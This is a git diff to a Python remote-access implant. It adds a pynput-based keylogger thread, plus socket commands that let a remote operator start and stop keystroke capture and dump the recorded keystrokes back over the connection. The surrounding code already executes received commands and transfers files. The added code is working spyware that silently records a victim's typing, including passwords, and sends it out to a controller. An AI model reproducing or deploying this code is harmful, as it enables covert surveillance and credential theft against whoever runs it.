@@ -1,8 +1,54 @@
+from threading import Thread
 import sys
 import json
 import socket
 import os
 from ExecuteTerminal import TermialExecutor
+import pynput.keyboard
+from termcolor import cprint
+
+
+class Color:
+    def __init__(self) -> None:
+        self.red = "red"
+        self.green = "green"
+        self.yellow = "yellow"
+
+
+keylogvar = ""
+keylogthread = None
+keyboard_Listener = None
+color = Color()
+
+
+def process_Key_Press(key):
+    global keylogvar
+    try:
+        keylogvar += str(key.char)
+    except AttributeError:
+        if key == key.space:
+            keylogvar += " "
+        else:
+            # keylogvar += str(key)
+            keylogvar += " "
+
+
+def dumpLog():
+    logmsg = keylogvar
+    return logmsg
+
+
+def keyBoardLoggerFunc():
+    global keyboard_Listener
+    try:
+        keyboard_Listener = pynput.keyboard.Listener(on_press=process_Key_Press)
+        with keyboard_Listener:
+            keyboard_Listener.join()
+    except Exception as ex:
+        cprint("[-]Something wen Wrong", color.red)
+    finally:
+        cprint("[-] Terminating keyLoggerThread...", color.red)
+
 
 byt = 1024 * 10
 
@@ -66,6 +112,8 @@ def download_file(filename, clientsocket: socket.socket):
 
 
 def main():
+    global keylogthread
+    global keyboard_Listener
     if len(sys.argv) != 3:
         print("[+] Usage python ./server.py IP PORT")
         print("[+] Example python ./server.py 192.168.0.151 8000")
@@ -79,8 +127,46 @@ def main():
         while True:
             command = receive_Message(sock)
             print(f"[+] COMMAND:~>{command}")
+            # quit the program
             if command == "quit":
+                """before exiting check if the keylogger still exits"""
+                if keyboard_Listener:
+                    print("[-] Starting to terminate keylogger thread...")
+                    keyboard_Listener.stop()
+                    print("[+] Keylogger thread joined..")
+                    keylogthread.join()
+                    return exit()
                 exit()
+            # stop the key logger
+            if command == "stop keylogger":
+                if keyboard_Listener:
+                    print("[-] Starting to terminate keylogger thread...")
+                    keyboard_Listener.stop()
+                    print("[+] Keylogger thread joined..")
+                    keylogthread.join()
+                    send_Message(sock, "Key Logger Stopped")
+                    keyboard_Listener=None
+                    keylogthread=None
+                else:
+                    send_Message(sock, "No key logger running")
+                continue
+            # start key logger
+            if command == "start keylogger":
+                if keyboard_Listener == None:
+                    cprint("[+] Starting keylogger thread ....")
+                    keylogthread = Thread(target=keyBoardLoggerFunc)
+                    keylogthread.start()
+                    cprint("[+] Started keylogger thread ....")
+                    send_Message(sock, "Started keylogger thread ....")
+                else:
+                    send_Message(sock, "Key board Logger Already Running....")
+                continue
+            
+            # dump log
+            if command == "dump log":
+                print("[+] dum log", dumpLog())
+                send_Message(sock, dumpLog())
+                continue
 
             # upload file when the server presses download
             if command[0:8] == "download":
